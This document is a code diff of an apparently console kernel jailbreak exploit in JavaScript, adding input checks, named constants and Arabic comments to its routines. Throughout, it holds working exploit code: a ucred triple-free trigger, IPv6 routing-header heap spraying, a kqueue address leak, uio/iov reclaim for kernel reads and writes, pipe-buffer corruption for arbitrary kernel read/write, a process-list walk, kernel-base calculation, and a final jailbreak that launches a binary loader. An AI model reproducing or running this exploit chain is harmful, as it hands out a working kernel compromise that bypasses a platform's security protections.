@@ -801,10 +801,15 @@ function cleanup() {
   debug('Cleanup completed');
 }
 function fill_buffer_64(buf, val, len) {
-  for (var i = 0; i < len; i = i + 8) {
+  if (!buf || buf.eq(0) || len <= 0) {
+    log('fill_buffer_64: invalid buf/len');
+    return;
+  }
+  for (var i = 0; i < len; i += 8) {
     write64(buf.add(i), val);
   }
 }
+
 function find_twins() {
   var count = 0;
   var val, i, j;
@@ -825,21 +830,23 @@ function find_twins() {
         cleanup();
         return false;
       }
-    } else zeroMemoryCount = 0;
+    } else {
+      zeroMemoryCount = 0;
+    }
 
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+      if (!ipv6_socks[i] || ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2 (memory barrier)
+      read32(spray_add); // memory barrier
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (!ipv6_socks[i] || ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      write32(leak_add, 0); // تعديل رقم 4
+      write32(leak_add, 0);
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
 
       val = read32(leak_add);
@@ -864,6 +871,7 @@ function find_twins() {
   log('find_twins failed');
   return false;
 }
+
 function find_triplet(master, other, iterations) {
   if (typeof iterations === 'undefined')
     iterations = MAX_ROUNDS_TRIPLET;
@@ -878,21 +886,20 @@ function find_triplet(master, other, iterations) {
 
     for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+      if (!ipv6_socks[i] || ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2
+      read32(spray_add);
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
-    write32(leak_add, 0); // تعديل رقم 4
+    write32(leak_add, 0);
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
 
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // تعديل رقم 3 (منع false positives)
     if (j === master || j === other) {
       count++;
       continue;
@@ -908,11 +915,16 @@ function find_triplet(master, other, iterations) {
 
   return -1;
 }
+
 function init_threading() {
   var jmpbuf = malloc(0x60);
+  if (!jmpbuf || jmpbuf.eq(0)) {
+    log('init_threading: malloc jmpbuf failed');
+    return;
+  }
   setjmp(jmpbuf);
   saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
-  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
+  saved_mxcsr    = Number(read32(jmpbuf.add(0x44)));
 }
 var LOG_MAX_LINES = 38;
 var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
@@ -1033,24 +1045,42 @@ function exploit_phase_jailbreak() {
   jailbreak();
 }
 function setup_arbitrary_rw() {
+  debug('setup_arbitrary_rw - start');
+
+  // حراسة على kq_fdp
+  if (kq_fdp.eq(0)) {
+    log('setup_arbitrary_rw: invalid kq_fdp (0)');
+    throw new Error(' Jailbreak failed - Reboot and try again');
+  }
+
   // Leak fd_files from kq_fdp.
   var fd_files = kreadslow64_safe(kq_fdp);
   fdt_ofiles = fd_files.add(0x00);
   debug('fdt_ofiles: ' + hex(fdt_ofiles));
+
+  // تأكيد صلاحية master_pipe / victim_pipe
+  if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
+    log('setup_arbitrary_rw: invalid pipe fds');
+    throw new Error(' Jailbreak failed - Reboot and try again');
+  }
+
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   debug('master_r_pipe_file: ' + hex(master_r_pipe_file));
+
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file));
+
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   debug('master_r_pipe_data: ' + hex(master_r_pipe_data));
+
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data));
 
   // Corrupt pipebuf of masterRpipeFd.
-  write32(master_pipe_buf.add(0x00), 0); // cnt
-  write32(master_pipe_buf.add(0x04), 0); // in
-  write32(master_pipe_buf.add(0x08), 0); // out
-  write32(master_pipe_buf.add(0x0C), PAGE_SIZE); // size
+  write32(master_pipe_buf.add(0x00), 0);          // cnt
+  write32(master_pipe_buf.add(0x04), 0);          // in
+  write32(master_pipe_buf.add(0x08), 0);          // out
+  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);  // size
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data); // buffer
 
   var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
@@ -1072,194 +1102,313 @@ function setup_arbitrary_rw() {
 
   // Remove triple freed file from free list
   remove_uaf_file();
+
   for (var i = 0; i < 0x20; i = i + 8) {
     var readed = kread64(master_r_pipe_data.add(i));
     debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed));
   }
+
   log('Arbitrary R/W achieved');
   debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)));
 }
+
 function find_allproc() {
   // Use existing master_pipe instead of creating new one
   var pipe_0 = master_pipe[0];
   var pipe_1 = master_pipe[1];
+
+  if (pipe_0 < 0 || pipe_1 < 0) {
+    log('find_allproc: invalid master_pipe fds');
+    return new BigInt(0);
+  }
+
   debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
   debug('find_allproc - Getting pid...');
   var pid = Number(getpid());
   debug('find_allproc - pid: ' + pid);
+
   debug('find_allproc - Writing pid to sockopt_val_buf...');
   write32(sockopt_val_buf, pid);
+
   debug('find_allproc - Calling ioctl FIOSETOWN...');
   var ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf);
   debug('find_allproc - ioctl returned: ' + ioctl_ret);
+
   debug('find_allproc - Getting fp...');
   var fp = fget(pipe_0);
   debug('find_allproc - fp: ' + hex(fp));
+
   debug('find_allproc - Reading f_data...');
   var f_data = kread64(fp.add(0x00));
   debug('find_allproc - f_data: ' + hex(f_data));
+
   debug('find_allproc - Reading pipe_sigio...');
   var pipe_sigio = kread64(f_data.add(0xd0));
   debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio));
+
   debug('find_allproc - Reading p...');
   var p = kread64(pipe_sigio);
   debug('find_allproc - initial p: ' + hex(p));
+
   kernel.addr.curproc = p; // Set global curproc
 
   debug('find_allproc - Walking process list...');
   var walk_count = 0;
-  while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
+  var mask = new BigInt(0xFFFFFFFF, 0x00000000);
+
+  while (!p.and(mask).eq(mask)) {
     p = kread64(p.add(0x08)); // p_list.le_prev
     walk_count++;
     if (walk_count % 100 === 0) {
       debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p));
     }
   }
+
   debug('find_allproc - Found allproc after ' + walk_count + ' iterations');
 
   // Don't close - using master_pipe which we need
-
   return p;
 }
 function jailbreak() {
   debug('jailbreak - Starting...');
+
+  // حراسة على الـ offsets والـ FW
   if (!kernel_offset) {
+    log('jailbreak: kernel_offset not loaded');
     throw new Error('Kernel offsets not loaded');
   }
   if (FW_VERSION === null) {
+    log('jailbreak: FW_VERSION is null');
     throw new Error('FW_VERSION is null');
   }
+
   // Stabilize
   for (var i = 0; i < 10; i++) {
     sched_yield();
   }
+
   debug('jailbreak - Calling find_allproc...');
-  kernel.addr.allproc = find_allproc(); // Set global allproc
+  kernel.addr.allproc = find_allproc();
   debug('allproc: ' + hex(kernel.addr.allproc));
 
   // Calculate kernel base
+  if (!kl_lock || kl_lock.eq(0)) {
+    log('jailbreak: kl_lock is invalid');
+    throw new Error('kl_lock is invalid');
+  }
+
   kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
   log('Kernel base: ' + hex(kernel.addr.base));
+
+  // المنطق المشترك حسب الـ FW
   jailbreak_shared(FW_VERSION);
+
   log('Jailbreak Complete - JAILBROKEN');
   utils.notify('Jailbreak Success');
   utils.notify('M.ELHOUT');
-  cleanup(false); // Close sockets and kill workers on success
+
+  // Cleanup من غير قتل الـ workers بقوة
+  cleanup(false);
+
   show_success();
   run_binloader();
 }
 function fhold(fp) {
-  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1); // f_count
+  // زيادة f_count مع حراسة بسيطة
+  if (fp.eq(0)) {
+    log('fhold: invalid fp (0)');
+    return;
+  }
+  var count = kread32(fp.add(0x28)); // f_count
+  kwrite32(fp.add(0x28), count + 1);
 }
+
 function fget(fd) {
+  // حراسة على fd
+  if (fd < 0) {
+    log('fget: invalid fd ' + fd);
+    return new BigInt(0);
+  }
   return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
 }
+
 function remove_rthr_from_socket(fd) {
   // In case last triplet was not found in kwriteslow
   // At this point we don't care about twins/triplets
-  if (fd > 0) {
-    var fp = fget(fd);
-    var f_data = kread64(fp.add(0x00));
-    var so_pcb = kread64(f_data.add(0x18));
-    var in6p_outputopts = kread64(so_pcb.add(0x118));
-    kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
+  if (fd <= 0) {
+    log('remove_rthr_from_socket: invalid fd ' + fd);
+    return;
   }
+
+  var fp = fget(fd);
+  if (fp.eq(0)) {
+    log('remove_rthr_from_socket: fget returned 0 for fd ' + fd);
+    return;
+  }
+
+  var f_data = kread64(fp.add(0x00));
+  var so_pcb = kread64(f_data.add(0x18));
+  var in6p_outputopts = kread64(so_pcb.add(0x118));
+  kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
 }
+
 var victim_pipe_buf = malloc(PIPEBUF_SIZE);
+
 function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   if (buffer.eq(0)) {
     throw new Error('buffer cannot be zero');
   }
-  write32(victim_pipe_buf.add(0x00), cnt); // cnt
-  write32(victim_pipe_buf.add(0x04), _in); // in
-  write32(victim_pipe_buf.add(0x08), out); // out
-  write32(victim_pipe_buf.add(0x0C), size); // size
+  if (size <= 0 || size > PAGE_SIZE) {
+    log('corrupt_pipe_buf: invalid size ' + size);
+    return BigInt_Error;
+  }
+
+  write32(victim_pipe_buf.add(0x00), cnt);   // cnt
+  write32(victim_pipe_buf.add(0x04), _in);   // in
+  write32(victim_pipe_buf.add(0x08), out);   // out
+  write32(victim_pipe_buf.add(0x0C), size);  // size
   write64(victim_pipe_buf.add(0x10), buffer); // buffer
+
   write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
-
-  // Debug
-  /*
-    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
-    for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
-        const readed = read64(victim_pipe_buf.add(i));
-        debug("corrupt_read: " + hex(readed) );
-    }
-        */
-
   return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
 }
+
 function kwrite(dest, src, n) {
+  if (dest.eq(0) || src.eq(0) || n <= 0) {
+    log('kwrite: invalid dest/src/size');
+    return BigInt_Error;
+  }
+
   corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
   return write(new BigInt(victimWpipeFd), src, n);
 }
+
 function kread(dest, src, n) {
   debug('Enter kread for src: ' + hex(src));
+
+  if (dest.eq(0) || src.eq(0) || n <= 0) {
+    log('kread: invalid dest/src/size');
+    return BigInt_Error;
+  }
+
   corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
-  // Debug
   read(new BigInt(victimRpipeFd), dest, n);
-  // for (const i=0; i<n; i=i+8) {
-  //    const readed = read64(dest.add(i));
-  // debug("kread_read: " + hex(readed) );
-  // }
 }
 function kwrite64(addr, val) {
+  if (addr.eq(0)) {
+    log('kwrite64: invalid addr 0');
+    return;
+  }
   write64(tmp, val);
   kwrite(addr, tmp, 8);
 }
+
 function kwrite32(addr, val) {
+  if (addr.eq(0)) {
+    log('kwrite32: invalid addr 0');
+    return;
+  }
   write32(tmp, val);
   kwrite(addr, tmp, 4);
 }
+
 function kread64(addr) {
+  if (addr.eq(0)) {
+    log('kread64: invalid addr 0');
+    return new BigInt(0);
+  }
   kread(tmp, addr, 8);
   return read64(tmp);
 }
+
 function kread32(addr) {
+  if (addr.eq(0)) {
+    log('kread32: invalid addr 0');
+    return 0;
+  }
   kread(tmp, addr, 4);
   return read32(tmp);
 }
+
 function read_buffer(addr, len) {
+  if (addr.eq(0) || len <= 0) {
+    log('read_buffer: invalid addr/len');
+    return new Uint8Array(0);
+  }
   var buffer = new Uint8Array(len);
   for (var i = 0; i < len; i++) {
     buffer[i] = Number(read8(addr.add(i)));
   }
   return buffer;
 }
+
 function write_buffer(addr, buffer) {
+  if (addr.eq(0) || !buffer || buffer.length === 0) {
+    log('write_buffer: invalid addr/buffer');
+    return;
+  }
   for (var i = 0; i < buffer.length; i++) {
     write8(addr.add(i), buffer[i]);
   }
 }
 
 // Functions used in global kernel.js
-// buf is Uint8Array()
 kernel.read_buffer = function (kaddr, len) {
+  if (kaddr.eq(0) || len <= 0) {
+    log('kernel.read_buffer: invalid kaddr/len');
+    return new Uint8Array(0);
+  }
   kread(tmp, kaddr, len);
   return read_buffer(tmp, len);
 };
+
 kernel.write_buffer = function (kaddr, buf) {
+  if (kaddr.eq(0) || !buf || buf.length === 0) {
+    log('kernel.write_buffer: invalid kaddr/buf');
+    return;
+  }
   write_buffer(tmp, buf);
   kwrite(kaddr, tmp, buf.length);
 };
+
 function remove_uaf_file() {
   if (uaf_socket === undefined) {
     throw new Error('uaf_socket is undefined');
   }
+
+  if (uaf_socket < 0) {
+    log('remove_uaf_file: invalid uaf_socket');
+    return;
+  }
+
   var uafFile = fget(uaf_socket);
   kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
+
   var removed = 0;
+
   for (var i = 0; i < 0x1000; i++) {
     var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+
+    if (s <= 0) {
+      continue;
+    }
+
     if (fget(s).eq(uafFile)) {
       kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
       removed++;
     }
+
     close(new BigInt(s));
+
     if (removed === 3) {
       break;
     }
   }
 }
+// ثوابت بدل الأرقام السحرية
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 32;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 10000;
+
 function trigger_ucred_triplefree() {
   var end = false;
 
@@ -1274,6 +1423,11 @@ function trigger_ucred_triplefree() {
 
     // 1) dummy socket → netcontrol register
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (dummy_socket.eq(BigInt_Error)) {
+      log('trigger_ucred_triplefree: dummy_socket failed');
+      continue;
+    }
+
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
 
@@ -1285,6 +1439,10 @@ function trigger_ucred_triplefree() {
 
     // 4) reclaim fd
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+    if (uaf_socket <= 0) {
+      log('trigger_ucred_triplefree: uaf_socket invalid');
+      continue;
+    }
 
     // 5) free previous ucred
     setuid(1);
@@ -1294,13 +1452,13 @@ function trigger_ucred_triplefree() {
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
     // 7) restore cr_refcnt = 1
-    for (var i = 0; i < 32; i++) {
+    for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
       sched_yield();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
-      sched_yield(); // تعديل رقم 5
+      sched_yield();
     }
 
     // 8) double free أول مرة
@@ -1309,7 +1467,8 @@ function trigger_ucred_triplefree() {
     // 9) إيجاد التوأم
     end = find_twins();
     if (!end) {
-      twins[0] = -1; twins[1] = -1; // تعديل رقم 1
+      twins[0] = -1;
+      twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
@@ -1322,11 +1481,11 @@ function trigger_ucred_triplefree() {
     var count = 0;
 
     // 11) loop لإعادة refcnt = 1
-    while (count < 10000) {
+    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       trigger_iov_recvmsg();
       sched_yield();
 
-      write32(leak_rthdr.add(0x04), 0); // تعديل رقم 4
+      write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
       if (read32(leak_rthdr) === 1) break;
@@ -1339,8 +1498,9 @@ function trigger_ucred_triplefree() {
       count++;
     }
 
-    if (count === 10000) {
-      twins[0] = -1; twins[1] = -1;
+    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      twins[0] = -1;
+      twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
@@ -1354,7 +1514,8 @@ function trigger_ucred_triplefree() {
     // 13) إيجاد triplet 1
     triplets[1] = find_triplet(triplets[0], -1);
     if (triplets[1] === -1) {
-      twins[0] = -1; twins[1] = -1;
+      twins[0] = -1;
+      twins[1] = -1;
       write(new BigInt(iov_sock_1), tmp, 1);
       close(new BigInt(uaf_socket));
       end = false;
@@ -1366,7 +1527,8 @@ function trigger_ucred_triplefree() {
     // 14) إيجاد triplet 2
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] === -1) {
-      twins[0] = -1; twins[1] = -1;
+      twins[0] = -1;
+      twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
@@ -1386,6 +1548,12 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking kqueue...');
 
+  // تأكيد صلاحية triplets[1] قبل استخدامه
+  if (typeof triplets[1] === 'undefined' || triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
+    log('leak_kqueue: invalid triplets[1]');
+    return false;
+  }
+
   // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
 
@@ -1393,9 +1561,11 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 5000;
 
-  while (count < MAX_KQ) {
+  // استخدام الثابت العالمي بدل MAX_KQ المحلي
+  var max_iters = KQUEUE_ITERATIONS;
+
+  while (count < max_iters) {
     count++;
 
     kq = kqueue();
@@ -1413,16 +1583,19 @@ function leak_kqueue() {
     var magic = read64(magic_add);
     var fdp   = read64(leak_rthdr.add(0x98));
 
-    if (magic.eq(magic_val) && !fdp.eq(0)) {
-      break;
+    // لو القراءة فاضية أو غير منطقية، نقفل kq ونكمل
+    if (!magic.eq(magic_val) || fdp.eq(0)) {
+      close(kq);
+      sched_yield();
+      continue;
     }
 
-    close(kq);
-    sched_yield();
+    // وصلنا لقيمة صحيحة
+    break;
   }
 
-  if (count >= MAX_KQ) {
-    log('leak_kqueue: exceeded MAX_KQ iterations');
+  if (count >= max_iters) {
+    log('leak_kqueue: exceeded KQUEUE_ITERATIONS');
     return false;
   }
 
@@ -1436,6 +1609,7 @@ function leak_kqueue() {
 
   debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
 
+  // تأكيد إغلاق آخر kq مستخدم
   close(kq);
 
   // إعادة بناء triplets[1] بعد ما استخدمناه في free
@@ -1453,15 +1627,29 @@ function leak_kqueue_safe() {
   }
 }
 function kreadslow64(address) {
+  debug('kreadslow64: addr=' + hex(address));
+
+  if (address.eq(0)) {
+    log('kreadslow64: invalid address 0');
+    return BigInt_Error;
+  }
+
   var buffer = kreadslow(address, 8);
-  // debug("Buffer from kreadslow: " + hex(buffer));
   if (buffer.eq(BigInt_Error)) {
     cleanup();
     throw new Error(' Jailbreak failed - Reboot and try again');
   }
   return read64(buffer);
 }
+
 function kreadslow64_safe(address) {
+  debug('kreadslow64_safe: addr=' + hex(address));
+
+  if (address.eq(0)) {
+    log('kreadslow64_safe: invalid address 0');
+    return BigInt_Error;
+  }
+
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
     log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' + hex(address));
@@ -1471,19 +1659,25 @@ function kreadslow64_safe(address) {
   return read64(buffer);
 }
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  write64(uio.add(0x00), uio_iov); // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
-  write64(uio.add(0x10), BigInt_Error); // uio_offset
-  write64(uio.add(0x18), size); // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
-  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_segflg
-  write64(uio.add(0x28), uio_td); // uio_td
-  write64(uio.add(0x30), addr); // iov_base
-  write64(uio.add(0x38), size); // iov_len
+  write64(uio.add(0x00), uio_iov);          // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM);      // uio_iovcnt
+  write64(uio.add(0x10), BigInt_Error);     // uio_offset
+  write64(uio.add(0x18), size);             // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE);     // uio_segflg
+  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
+  write64(uio.add(0x28), uio_td);           // uio_td
+  write64(uio.add(0x30), addr);             // iov_base
+  write64(uio.add(0x38), size);             // iov_len
 }
+var KREAD_MAX_ITERS = 10000; // بدل 10000 الهاردكود
+
 function kreadslow(addr, size) {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);
+  debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);
+
+  if (addr.eq(0) || size <= 0) {
+    log('kreadslow: invalid addr/size');
+    return BigInt_Error;
+  }
 
   // Memory exhaustion check
   if (debugging.info.memory.available === 0) {
@@ -1497,6 +1691,10 @@ function kreadslow(addr, size) {
   var leak_buffers = new Array(UIO_THREAD_NUM);
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
+    if (!leak_buffers[i]) {
+      log('kreadslow - malloc leak_buffers[' + i + '] failed');
+      return BigInt_Error;
+    }
   }
 
   // Set send buf size.
@@ -1510,6 +1708,12 @@ function kreadslow(addr, size) {
   write64(uioIovRead.add(0x08), size);
   debug('kreadslow - Freeing triplets[1]=' + triplets[1]);
 
+  // تأكيد صلاحية triplets[1]
+  if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
+    log('kreadslow - invalid triplets[1]');
+    return BigInt_Error;
+  }
+
   // Free one.
   free_rthdr(ipv6_socks[triplets[1]]);
 
@@ -1518,8 +1722,9 @@ function kreadslow(addr, size) {
   debug('kreadslow - Starting uio reclaim loop...');
   var count = 0;
   var zeroMemoryCount = 0;
+
   // Reclaim with uio.
-  while (count < 10000) {
+  while (count < KREAD_MAX_ITERS) {
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
@@ -1534,6 +1739,7 @@ function kreadslow(addr, size) {
     if (count % 100 === 1) {
       debug('kreadslow - uio loop iter ' + count);
     }
+
     trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
     sched_yield();
 
@@ -1553,10 +1759,12 @@ function kreadslow(addr, size) {
     // Fill queue.
     write(new BigInt(uio_sock_1), tmp, size);
   }
-  if (count === 10000) {
-    debug('kreadslow - Failed uio reclaim after 10000 iterations');
+
+  if (count >= KREAD_MAX_ITERS) {
+    debug('kreadslow - Failed uio reclaim after ' + count + ' iterations');
     return BigInt_Error;
   }
+
   debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
   var uio_iov = read64(leak_rthdr);
   debug('kreadslow - uio_iov: ' + hex(uio_iov));
@@ -1564,6 +1772,12 @@ function kreadslow(addr, size) {
   // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, true, addr, size);
   debug('kreadslow - Freeing triplets[2]=' + triplets[2]);
+
+  // تأكيد صلاحية triplets[2]
+  if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
+    log('kreadslow - invalid triplets[2]');
+    return BigInt_Error;
+  }
 
   // Free second one.
   free_rthdr(ipv6_socks[triplets[2]]);
@@ -1587,6 +1801,7 @@ function kreadslow(addr, size) {
     } else {
       zeroMemoryCount2 = 0;
     }
+
     // Reclaim with iov.
     trigger_iov_recvmsg();
     sched_yield();
@@ -1603,10 +1818,12 @@ function kreadslow(addr, size) {
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
+
   debug('kreadslow - Reading leak buffers...');
 
   // Wake up all threads.
   read(new BigInt(uio_sock_0), tmp, size);
+
   // Read the results now.
   var leak_buffer = new BigInt(0);
   var tag_val = new BigInt(0x41414141, 0x41414141);
@@ -1630,12 +1847,14 @@ function kreadslow(addr, size) {
 
   // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1);
+
   if (leak_buffer.eq(0)) {
     debug('kreadslow - No valid leak found');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
+
   debug('kreadslow - Finding triplets[2]...');
 
   // Find triplet[2].
@@ -1645,6 +1864,7 @@ function kreadslow(addr, size) {
     debug('kreadslow - triplets[2] retry ' + (retry + 1));
     sched_yield();
   }
+
   debug('kreadslow - triplets[2]=' + triplets[2]);
   if (triplets[2] === -1) {
     debug('kreadslow - Failed to find triplets[2]');
@@ -1653,17 +1873,6 @@ function kreadslow(addr, size) {
     return BigInt_Error;
   }
 
-  // Let's make sure that they are indeed triplets
-  // const leak_0 = malloc(8);
-  // const leak_1 = malloc(8);
-  // const leak_2 = malloc(8);
-
-  // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
-  // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
-  // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
-
-  // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );
-
   // Workers should have finished earlier no need to wait
   wait_iov_recvmsg();
   read(new BigInt(iov_sock_0), tmp, 1);
@@ -1671,8 +1880,27 @@ function kreadslow(addr, size) {
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);
+  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size: ' + size);
+
+  // حراسة على المدخلات
+  if (addr.eq(0) || size <= 0) {
+    log('kwriteslow: invalid addr/size');
+    return BigInt_Error;
+  }
+  if (buffer.eq(0)) {
+    log('kwriteslow: buffer cannot be zero');
+    return BigInt_Error;
+  }
+
+  // تأكيد صلاحية triplets[1] و triplets[2] قبل الاستخدام
+  if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
+    log('kwriteslow: invalid triplets[1]');
+    return BigInt_Error;
+  }
+  if (triplets[0] < 0 || triplets[0] >= ipv6_socks.length) {
+    log('kwriteslow: invalid triplets[0]');
+    return BigInt_Error;
+  }
 
   // Set send buf size.
   write32(sockopt_val_buf, size);
@@ -1700,6 +1928,7 @@ function kwriteslow(addr, buffer, size) {
     } else {
       zeroMemoryCount = 0;
     }
+
     trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
     sched_yield();
 
@@ -1716,11 +1945,18 @@ function kwriteslow(addr, buffer, size) {
     }
     wait_uio_readv();
   }
+
   var uio_iov = read64(leak_rthdr);
   // debug("This is uio_iov: " + hex(uio_iov));
 
   // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, false, addr, size);
+
+  // تأكيد صلاحية triplets[2] قبل الـ free
+  if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
+    log('kwriteslow: invalid triplets[2] before free');
+    return BigInt_Error;
+  }
 
   // Free second one.
   free_rthdr(ipv6_socks[triplets[2]]);
@@ -1741,6 +1977,7 @@ function kwriteslow(addr, buffer, size) {
     } else {
       zeroMemoryCount2 = 0;
     }
+
     // Reclaim with iov.
     trigger_iov_recvmsg();
     sched_yield();
